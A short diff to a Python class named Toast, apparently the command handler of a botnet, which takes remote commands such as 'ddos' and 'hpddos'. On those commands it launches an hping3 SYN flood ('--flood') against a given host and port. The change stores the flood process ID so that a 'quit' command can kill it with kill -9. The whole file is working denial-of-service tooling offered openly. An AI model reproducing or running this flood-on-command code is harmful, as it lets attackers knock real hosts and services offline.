@@ -25,6 +25,8 @@ class Toast(BaseResponder):
 			print('>>> COMMAND RECEIVED: %s' % command)
 			cmd, *params = command.split()
 
+			hping_pid = 0
+
 			# !ddos 192.168.1.66:80
 			if cmd == 'ddos' and params:
 				self.respond(msg, command + ' ok')
@@ -35,14 +37,14 @@ class Toast(BaseResponder):
 			elif cmd == 'hpddos' and params:
 				host, port = params[0].split(':')
 				#hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood 192.168.100.83
-				hping = subprocess.Popen(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', port, '--flood', host])
+				hping_pid = subprocess.Popen(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', port, '--flood', host]).pid
 			elif cmd == 'quit':
 				self.respond(msg, command + ' ok')
 				self.respond(msg, 'Bye!')
 				try:
-					hping.terminate()
-				except Exception:
-					pass
+					subprocess.call(['kill', '-9', str(hping_pid)])
+				except Exception as e:
+					print(e)
 				print(subprocess.call(['kill', '-9', str(os.getpid())]))
 			else:
 				self.respond(msg, 'no such command')
